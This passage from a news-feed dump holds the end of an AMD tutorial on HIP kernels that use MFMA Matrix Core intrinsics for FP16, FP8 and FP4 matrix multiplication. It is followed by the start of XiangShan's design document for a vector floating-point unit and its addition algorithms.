    &lt;code&gt;mfma_fp32_32x32x2_fp32&amp;lt;&amp;lt;&amp;lt;1, 64&amp;gt;&amp;gt;&amp;gt;(A_device, B_device, C_device);
&lt;/code&gt;
    &lt;p&gt;Please note that we use the vector data type &lt;code&gt;fp32x16_t&lt;/code&gt; to store the entries of the matrix &lt;code&gt;C&lt;/code&gt; in registers. Additionally, we zero-initialize &lt;code&gt;c&lt;/code&gt;, since we compute &lt;code&gt;C = A * B&lt;/code&gt; without accumulation.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.2. __builtin_amdgcn_mfma_f32_16x16x16f16&lt;/head&gt;
    &lt;p&gt;This example demonstrates how to multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;16x16&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;16x16&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;16x16&lt;/code&gt;. The input matrices are stored in FP16 and the output matrix stored in FP32. In this case, each thread stores &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;C&lt;/code&gt;. The data layout for this instruction is shown below. For illustrative purposes, the elements stored by the first thread within the wavefront are highlighted in red.&lt;/p&gt;
    &lt;p&gt;Figure 6: Data layout for __builtin_amdgcn_mfma_f32_16x16x16f16. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;Corresponding HIP kernel is implemented below:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_fp16.h&amp;gt;

using fp16_t = _Float16;
using fp16x4_t = __attribute__((vector_size(4 * sizeof(fp16_t)))) fp16_t;
using fp32x4_t = __attribute__((vector_size(4 * sizeof(float)))) float;

__global__ void
mfma_fp32_16x16x16_fp16(const fp16_t* A, const fp16_t* B, float* C) {

    fp16x4_t a_reg;
    fp16x4_t b_reg;
    fp32x4_t c_reg {};

    a_reg = *reinterpret_cast&amp;lt;const fp16x4_t*&amp;gt;(A + 4 * (threadIdx.x / 16) + 16 * (threadIdx.x % 16));

    for (int i = 0; i &amp;lt; 4; i++) {
        b_reg[i] = *(B + i * 16 + threadIdx.x % 16 + (threadIdx.x / 16) * 64);
    }

    c_reg = __builtin_amdgcn_mfma_f32_16x16x16f16(a_reg, b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        *(C + i * 16 + threadIdx.x % 16 + (threadIdx.x / 16) * 64) = c_reg[i];
    }
}
&lt;/code&gt;
    &lt;p&gt;Please note that both &lt;code&gt;__half&lt;/code&gt; and &lt;code&gt;_Float16&lt;/code&gt; types can be used in device code. However, the host supports only &lt;code&gt;_Float16&lt;/code&gt; type for arithmetic operations. As in the previous example, we use vector data types to store the matrix elements in registers.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.3. __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8&lt;/head&gt;
    &lt;p&gt;In this example we will multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;32x16&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;16x32&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. The input matrices are stored in FP8 and the output matrix is stored in FP32. In this scenario, each thread stores &lt;code&gt;8&lt;/code&gt; elements of the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;8&lt;/code&gt; elements of the matrix &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; elements of the matrix &lt;code&gt;C&lt;/code&gt;. The operands are distributed according to the scheme below. For illustrative purposes, the elements stored by the first thread within the wavefront are highlighted in red.&lt;/p&gt;
    &lt;p&gt;Figure 7: Data layout for __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code example below implements this operation as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_fp8.h&amp;gt;

using fp8_t = __hip_fp8_storage_t;
using fp8x8_t = __attribute__((vector_size(8 * sizeof(fp8_t)))) fp8_t;
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x16_fp8_fp8(const fp8_t* A, const fp8_t* B, float* C) {
    fp8x8_t a_reg;
    fp8x8_t b_reg;
    fp32x16_t c_reg {};

    a_reg = *reinterpret_cast&amp;lt;const fp8x8_t*&amp;gt;(A + (threadIdx.x / 32) * 8 + (threadIdx.x % 32) * 16);

    for (int i = 0; i &amp;lt; 8; i++) {
        b_reg[i] = *(B + i * 32 + threadIdx.x % 32 + (threadIdx.x / 32) * 8 * 32);
    }

    c_reg = __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8((long)a_reg, (long)b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;To define FP8, we use &lt;code&gt;__hip_fp8_storage_t&lt;/code&gt; type from &lt;code&gt;hip_fp8.h&lt;/code&gt;. Note that the intrinsic function expects its first two operands to be of type &lt;code&gt;long&lt;/code&gt;. To compile the code, the operands &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are, therefore, converted to &lt;code&gt;long&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.4. __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f8&lt;/head&gt;
    &lt;quote&gt;
      &lt;p&gt;Important note: the MFMA instruction discussed in this example is supported only on AMD CDNA™4 GPUs (gfx950). Please make sure to install AMD ROCm™ version 7.0 or later.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The AMD CDNA™4 architecture introduces a new family of MFMA instructions with block exponent scaling. The syntax of these instructions differs from the classic MFMA compiler intrinsics:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;d_reg = __builtin_amdgcn_mfma_scale_f32_MxNxK_f8f6f4(a_reg, b_reg, c_reg, Atype, Btype, OPSEL_A, scale_a, OPSEL_B, scale_b)&lt;/code&gt;
    &lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;MxNxK&lt;/code&gt;specifies shapes of the matrices&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;a_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;A&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;b_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;c_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;C&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;d_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Atype&lt;/code&gt;is an integer that specifies the data type of the matrix&lt;code&gt;A&lt;/code&gt;. The following values are possible:&lt;code&gt;0 = E4M3 (fp8), 1 = E5M2(bf8), 2 = E2M3(fp6), 3 = E3M2(bf6), 4 = E2M1(fp4)&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Btype&lt;/code&gt;is an integer that specifies the data type of the matrix&lt;code&gt;B&lt;/code&gt;. The following values are possible:&lt;code&gt;0 = E4M3 (fp8), 1 = E5M2(bf8), 2 = E2M3(fp6), 3 = E3M2(bf6), 4 = E2M1(fp4)&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;OPSEL_A&lt;/code&gt;,&lt;code&gt;OPSEL_B&lt;/code&gt;are OPSEL codes. These arguments are not relevant for the discussion and therefore will be set to&lt;code&gt;0&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;scale_a&lt;/code&gt;,&lt;code&gt;scale_b&lt;/code&gt;are scalars / vectors containing scale factors of type&lt;code&gt;E8M0&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As an example, let’s take a closer look at the instruction &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt;. The inputs to this instruction are&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Matrix &lt;code&gt;A&lt;/code&gt;of size&lt;code&gt;32x64&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;Ax&lt;/code&gt;of size&lt;code&gt;32x2&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;B&lt;/code&gt;of size&lt;code&gt;64x32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;Bx&lt;/code&gt;of size&lt;code&gt;2x32&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. Specifically, this instruction performs the following operation using single wavefront (64 threads):&lt;/p&gt;
    &lt;p&gt;Figure 8: Block-scaled matrix multiplication via __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4.&lt;/p&gt;
    &lt;p&gt;During dot product operations, the scales &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;Bx&lt;/code&gt; are applied after the normal dot product and prior to output/accumulation.&lt;/p&gt;
    &lt;p&gt;In this example, we will multiply two FP8 matrices using the &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; intrinsic function. The input matrices &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;B&lt;/code&gt; are stored in FP8 format, while the output matrix is stored in FP32. The scale matrices &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;Bx&lt;/code&gt; contain elements of type &lt;code&gt;E8M0&lt;/code&gt;. Each thread stores &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Bx&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; entries from the matrix &lt;code&gt;C&lt;/code&gt;. The operands are distributed according to the scheme below. Please note that this scheme is valid only if both input matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; have FP8 type. For illustrative purposes, the matrix elements stored by the thread with &lt;code&gt;threadIdx.x = 0&lt;/code&gt; are highlighted in light red, while the elements stored by the thread with &lt;code&gt;threadIdx.x = 32&lt;/code&gt; within the wavefront are highlighted in light green.&lt;/p&gt;
    &lt;p&gt;Figure 9: Data layout for __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4 with FP8 input matrices. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The following code example shows how this operation can be implemented as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_ext_ocp.h&amp;gt;

using fp8_t = __amd_fp8_storage_t;
using fp8x32_t = __attribute__((vector_size(32 * sizeof(fp8_t)))) fp8_t;
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x64_fp8_fp8(const fp8_t* A, const fp8_t* B, float* C) {
    fp8x32_t a_reg;
    fp8x32_t b_reg;
    fp32x16_t c_reg {};

    const fp8_t* ldg_a = A + (threadIdx.x % 32) * 64 + (threadIdx.x / 32) * 16;
    for (int i=0; i &amp;lt; 2; i++) {
        for (int j=0; j &amp;lt; 16; j++) {
            a_reg[i*16 + j] = *(ldg_a + i * 32 + j);
        }
    }

    const fp8_t* ldg_b = B + threadIdx.x % 32 + 32 * 16 * (threadIdx.x / 32);

    for (int i=0; i&amp;lt;2; i++) {
        for (int j=0; j &amp;lt; 16; j++) {
            b_reg[i*16 + j] = *(ldg_b + 32 * j + i * 32 * 32);
        }
    }

    uint8_t scale_a = 127;
    uint8_t scale_b = 127;

    c_reg = __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4(a_reg, b_reg, c_reg, 0, 0, 0, scale_a, 0, scale_b);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;Please note that in this example we use &lt;code&gt;__amd_fp8_storage_t&lt;/code&gt; type defined in &lt;code&gt;hip_ext_ocp.h&lt;/code&gt; to represent FP8. This library provides extensions APIs for low-precision and micro-scaling formats, and compared to &lt;code&gt;hip_fp8.h&lt;/code&gt;, exposes a wider capability set. &lt;code&gt;gfx950&lt;/code&gt; provides hardware acceleration for these APIs. Most of the APIs are 1 to 1 mapping of hardware instruction. Additionally, we use &lt;code&gt;uint8_t&lt;/code&gt; type to represent &lt;code&gt;E8M0&lt;/code&gt; scale factors. Since &lt;code&gt;scale_a&lt;/code&gt; and &lt;code&gt;scale_b&lt;/code&gt; encode exponent values, the corresponding actual scale factors are &lt;code&gt;2^(scale_a - 127)&lt;/code&gt; and &lt;code&gt;2^(scale_b - 127)&lt;/code&gt;. If &lt;code&gt;scale_a = scale_b = 127&lt;/code&gt;, the actual scale factors are equal to &lt;code&gt;1&lt;/code&gt; and no scaling is applied.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.5. __builtin_amdgcn_mfma_scale_f32_32x32x64_f4f4&lt;/head&gt;
    &lt;p&gt;In our last example, we demonstrate how to multiply two FP4 matrices using the &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; intrinsic function. As in the previous example, each thread stores &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Bx&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; entries from the matrix &lt;code&gt;C&lt;/code&gt;. The data layout for the output matrix remains the same as in the FP8 case. However, the data layout for the input matrices is different and depicted below. For illustrative purposes, the matrix elements stored by the thread with &lt;code&gt;threadIdx.x = 0&lt;/code&gt; are highlighted in light red, while the elements stored by the thread with &lt;code&gt;threadIdx.x = 32&lt;/code&gt; within the wavefront are highlighted in light green.&lt;/p&gt;
    &lt;p&gt;Figure 10: Data layout for __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4 with FP4 input matrices. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code snippet below demonstrates how to implement this operation as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_ext_ocp.h&amp;gt;

using fp4x2_t = __amd_fp4x2_storage_t;
using fp4x64_t  = fp4x2_t __attribute__((ext_vector_type(32)));
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x64_fp4_fp4(const fp4x2_t* A, const fp4x2_t* B, float* C) {

    fp4x64_t a_reg {};
    fp4x64_t b_reg {};
    fp32x16_t c_reg {};

    const fp4x2_t* ldg_a = A + (threadIdx.x % 32) * 32 + (threadIdx.x / 32) * 16;

    for (int i = 0; i &amp;lt; 16; i++) {
        a_reg[i] = *(ldg_a + i);
    }

    const fp4x2_t* ldg_b = B + (threadIdx.x % 32) / 2 + 16 * 32 * (threadIdx.x / 32);
    int b_extract_idx = threadIdx.x % 2;

    for (int i = 0; i &amp;lt; 16; i++) {
        uint8_t tmp0 = __amd_extract_fp4(*(ldg_b + 16 * 2 * i), b_extract_idx);
        uint8_t tmp1 = __amd_extract_fp4(*(ldg_b + 16 * (2 * i + 1)), b_extract_idx);
        b_reg[i] = __amd_create_fp4x2(tmp0, tmp1);
    }

    uint8_t scale_a = 127;
    uint8_t scale_b = 127;

    c_reg = __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4(a_reg, b_reg, c_reg, 4, 4, 0, scale_a, 0, scale_b);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;Since memory addressing is not allowed at a granularity smaller than 8 bits, we use &lt;code&gt;__amd_fp4x2_storage_t&lt;/code&gt; (an alias for &lt;code&gt;uint8_t&lt;/code&gt;) to store the input matrices and enable pointer operations. Note that the FP4 elements that need to be loaded from the matrix &lt;code&gt;B&lt;/code&gt; are not contiguous in memory. To extract a single FP4 element, we use the &lt;code&gt;__amd_extract_fp4&lt;/code&gt; function provided in &lt;code&gt;hip_ext_ocp.h&lt;/code&gt;. This function returns one FP4 element (of type &lt;code&gt;uint8_t&lt;/code&gt;) from a fp4x2 vector, based on the index passed as the second argument:&lt;/p&gt;
    &lt;code&gt;uint8_t __amd_extract_fp4(const __amd_fp4x2_storage_t x, const size_t index) {
    if (index == 0) return (x &amp;amp; 0xFu);
    return (x &amp;gt;&amp;gt; 4);
}
&lt;/code&gt;
    &lt;p&gt;Two FP4 values are then combined into &lt;code&gt;__amd_fp4x2_storage_t&lt;/code&gt; using &lt;code&gt;__amd_create_fp4x2&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;__amd_fp4x2_storage_t __amd_create_fp4x2(const uint8_t x, const uint8_t y) {
    __amd_fp4x2_storage_t ret = 0;
    ret = x | (y &amp;lt;&amp;lt; 4);
    return ret;
}
&lt;/code&gt;
    &lt;p&gt;The compiler intrinsic function &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; requires its first two arguments to be 256 bits wide. Since 32 FP4 elements occupy only 128 bits, we define &lt;code&gt;fp4x64_t&lt;/code&gt;, which is 256 bits wide. In this type, 128 bits contain data, while the remaining 128 bits are zero. This allows us to pass &lt;code&gt;a_reg&lt;/code&gt; and &lt;code&gt;b_reg&lt;/code&gt; to the intrinsic function and compile the code successfully.&lt;/p&gt;
    &lt;head rend="h2"&gt;Summary&lt;/head&gt;
    &lt;p&gt;In this article, we introduced Matrix Core instructions available on the AMD CDNA™3 and CDNA™4 architectures. We covered floating-point formats in detail, including modern low-precision element data types such as FP8, FP6, FP4, and the scale data type E8M0. We further explained how the floating-point types are represented as binary sequences and demonstrated, with concrete examples, how to convert their binary representations into real values. Next, we listed Matrix Core instructions supported by the modern CDNA™ architectures and discussed how to calculate the theoretical peak performance of Matrix Cores for specific MFMA instructions. To make the discussion more practical, we reviewed the compiler intrinsic functions that allow users to program Matrix Cores inside HIP kernels. Finally, we examined a subset of MFMA instructions in detail, providing code examples and illustrations to explain data layout and demonstrate how to implement simple mixed-precision MFMA operations in HIP. For additional information on Matrix Cores and low-precision data types, please refer to the following resources:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45476821</guid><pubDate>Sat, 04 Oct 2025 21:22:11 +0000</pubDate></item><item><title>XiangShan Vector Floating-Point Unit Design</title><link>https://docs.xiangshan.cc/projects/design/en/latest/backend/VFPU/</link><description>&lt;doc fingerprint="4631822b103a94a4"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;VFPU&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Version: V2R2&lt;/item&gt;
      &lt;item&gt;Status: OK&lt;/item&gt;
      &lt;item&gt;Date: 2025/01/20&lt;/item&gt;
      &lt;item&gt;commit：xxx&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Glossary of Terms&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Abbreviation&lt;/cell&gt;
        &lt;cell role="head"&gt;Full name&lt;/cell&gt;
        &lt;cell role="head"&gt;Descrption&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;VFPU&lt;/cell&gt;
        &lt;cell&gt;Vector Floating-Point Unit&lt;/cell&gt;
        &lt;cell&gt;Vector Floating-Point Functional Unit&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;IQ&lt;/cell&gt;
        &lt;cell&gt;Issue Queue&lt;/cell&gt;
        &lt;cell&gt;Issue Queue&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Design specifications&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Support Vector Floating-Point Mul Calculation&lt;/item&gt;
      &lt;item&gt;Support vector floating-point FMA computation&lt;/item&gt;
      &lt;item&gt;Support Vector Floating-Point Div Calculation&lt;/item&gt;
      &lt;item&gt;Support for vector floating-point Sqrt computation&lt;/item&gt;
      &lt;item&gt;Supports fp32, fp64, fp16 computation&lt;/item&gt;
      &lt;item&gt;Supports computation of RV-V1.0 version vector floating-point instructions&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Function&lt;/head&gt;
    &lt;p&gt;The VFPU module receives uop information issued from the Issue Queue and performs vector floating-point instruction calculations based on fuType and fuOpType information. It mainly consists of four modules: VFAlu, VFMA, VFDivSqrt, and VFCvt.&lt;/p&gt;
    &lt;p&gt;VFAlu is primarily responsible for fadd-related instructions and some other simple instructions, such as comparison instructions and sign injection instructions. Notably, the reduction sum instruction is also computed in this module by splitting into micro-operations (uops).&lt;/p&gt;
    &lt;p&gt;VFMA is primarily responsible for multiplication and multiply-add related instructions.&lt;/p&gt;
    &lt;p&gt;VFDivSqrt is primarily responsible for instructions related to division and square root.&lt;/p&gt;
    &lt;p&gt;VFCvt is primarily responsible for format conversion and reciprocal estimation-related instructions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Algorithm design&lt;/head&gt;
    &lt;p&gt;The challenge of the vector floating-point unit lies in supporting multiple single-precision format calculations (where the floating-point formats of operands and results are the same) and mixed-precision calculations (where the floating-point formats of operands and results differ). Taking common formats such as half-precision (\(f16\)), single-precision (\(f32\)), and double-precision (\(f64\)) as examples, the differences between scalar and vector floating-point units are compared.&lt;/p&gt;
    &lt;p&gt;Taking a typical floating-point addition as an example, for a scalar floating-point unit, it only needs to support calculations in three single-precision formats. The input operands and output results of this unit should all be \(64\)-bit, meaning it must support calculations in three formats:&lt;/p&gt;
    &lt;p&gt;(1) One \(f64 = f64 + f64\);&lt;/p&gt;
    &lt;p&gt;(2) \(1\) \(f32 = f32 + f32\);&lt;/p&gt;
    &lt;p&gt;(3) \(1\) \(f16 = f16 + f16\).&lt;/p&gt;
    &lt;p&gt;At first glance, three modules seem necessary to handle these three formats. However, since floating-point numbers consist of a sign bit, exponent, and mantissa, and higher-precision floating-point numbers have wider exponent and mantissa bit widths than lower-precision ones, the hardware design for higher-precision floating-point numbers can fully meet the requirements of lower-precision floating-point calculations. With slight modifications, adding \(Mux\) (multiplexers) to the hardware can enable compatibility with multiple single-precision formats, with only a marginal increase in area.&lt;/p&gt;
    &lt;p&gt;The vector floating-point unit needs to support vector operations, which are characterized by high data bandwidth utilization. For example, although the interface of a scalar arithmetic unit is 64-bit, when computing f32/f16, the effective data is only 32/16 bits, reducing bandwidth utilization to 50%/25%. The vector arithmetic unit also has a 64-bit interface, but when computing single-precision formats f32/f16, it can perform 2/4 sets of operations simultaneously, maintaining 100% bandwidth utilization. The supported single-precision format computations are as follows:&lt;/p&gt;
    &lt;p&gt;(1) One \(f64 = f64 + f64\);&lt;/p&gt;
    &lt;p&gt;(2) 2 \(f32 = f32 + f32\);&lt;/p&gt;
    &lt;p&gt;(3) \(4\) \(f16 = f16 + f16\).&lt;/p&gt;
    &lt;p&gt;Performing multiple sets of floating-point additions with the same format simultaneously makes hardware design more challenging than scalar operations, but it also allows the reuse of high-precision format hardware for low-precision formats. Additionally, a key feature that vector floating-point units must support is mixed-precision computation. The \(RISC-V\) vector instruction set extension defines a series of \(widening\) instructions requiring mixed-precision computation, mandating that floating-point addition units also support the following four computation formats:&lt;/p&gt;
    &lt;p&gt;(1) \(1\) \(f64 = f64 + f32\);&lt;/p&gt;
    &lt;p&gt;(2) One \(f64 = f32 + f32\);&lt;/p&gt;
    &lt;p&gt;(3) Two \(f32 = f32 + f16\);&lt;/p&gt;
    &lt;p&gt;(4) Two \(f32 = f16 + f16\).&lt;/p&gt;
    &lt;p&gt;The design difficulty of mixed-precision computation is much greater than that of multiple single-precision formats. On one hand, operands of different data formats need to be converted to the same format as the result before computation, increasing logical complexity. On the other hand, format conversion imposes significant pressure on circuit timing, especially when converting low-precision denormal numbers to high-precision floating-point numbers. Therefore, this paper specifically designs a fast data format conversion algorithm to address the timing issue.&lt;/p&gt;
    &lt;p&gt;In summary, the design challenges of the vector floating-point unit lie in the implementation of multiple single-precision formats and mixed-precision formats. This section will introduce the vector floating-point addition algorithm, floating-point sequential accumulation algorithm, vector fused multiply-add algorithm, and vector floating-point division algorithm to address these challenges, achieving a high-performance vector floating-point unit with a frequency of up to \(3GHz\).&lt;/p&gt;
    &lt;head rend="h3"&gt;Vector Floating-Point Addition&lt;/head&gt;
    &lt;p&gt;Floating-point addition is one of the most commonly used arithmetic operations in scientific computing. Although conceptually simple, the traditional single-path floating-point addition algorithm requires two to three signed addition steps, which is a relatively time-consuming operation. The dual-path floating-point addition algorithm has only one signed addition operation on the critical path in the worst case, thus offering significant speed advantages over the single-path algorithm. Based on the dual-path floating-point addition algorithm, this paper designs an even faster improved dual-path floating-point addition algorithm. This section first introduces the single-path floating-point addition algorithm, the dual-path floating-point addition algorithm, and the improved dual-path floating-point addition algorithm for single-precision format, and finally presents the vector floating-point addition algorithm.&lt;/p&gt;
    &lt;p&gt;The floating-point addition formula is expressed as: \(fp\_result = fp\_a + fp\_b\). When \(fp\_a\) and \(fp\_b\) have the same sign, the significands are aligned and added, which is referred to as equivalent addition. When \(fp\_a\) and \(fp\_b\) have opposite signs, the significands are aligned and subtracted, which is referred to as equivalent subtraction. For denormal numbers, the exponent is \(0\), and for normalized numbers, the exponent is \(1\), but the corresponding normalized exponent is the same. Therefore, when calculating the exponent difference, an exponent of \(0\) should be treated as \(1\) (referred to as the normalized exponent). The absolute difference between the normalized exponents is the normalized exponent difference.&lt;/p&gt;
    &lt;head rend="h4"&gt;Single-path floating-point addition algorithm&lt;/head&gt;
    &lt;p&gt;The traditional single-path floating-point addition operation is illustrated as follows, consisting of the following steps:&lt;/p&gt;
    &lt;p&gt;(1) Normalized exponent subtraction (ES): Calculate the difference between normalized exponents, d = |Ea - Eb|, where Ea and Eb are both normalized exponents.&lt;/p&gt;
    &lt;p&gt;(2) Alignment (\(Align\)): Shift the significand of the smaller operand right by \(d\) bits. The larger exponent is denoted as \(Ef\).&lt;/p&gt;
    &lt;p&gt;(3) Significand addition (\(SA\)): Performs addition or subtraction based on the effective operation \(Eo\), which is the arithmetic operation executed by the adder in the floating-point addition unit, determined by the sign bits of the two floating-point operands.&lt;/p&gt;
    &lt;p&gt;(4) Conversion (\(Conv\)): If the significand addition result is negative, convert the result to sign-magnitude representation. The conversion is completed through an addition step, with the result denoted as \(Sf\).&lt;/p&gt;
    &lt;p&gt;(5) Leading zero detection (LZD): Calculates the required left or right shift amount, expressed as \(En\), where right shift is positive and left shift is negative.&lt;/p&gt;
    &lt;p&gt;(6) Normalization (\(Norm\)): Normalize the significand by shifting \(En\) bits and add \(En\) to \(Ef\).&lt;/p&gt;
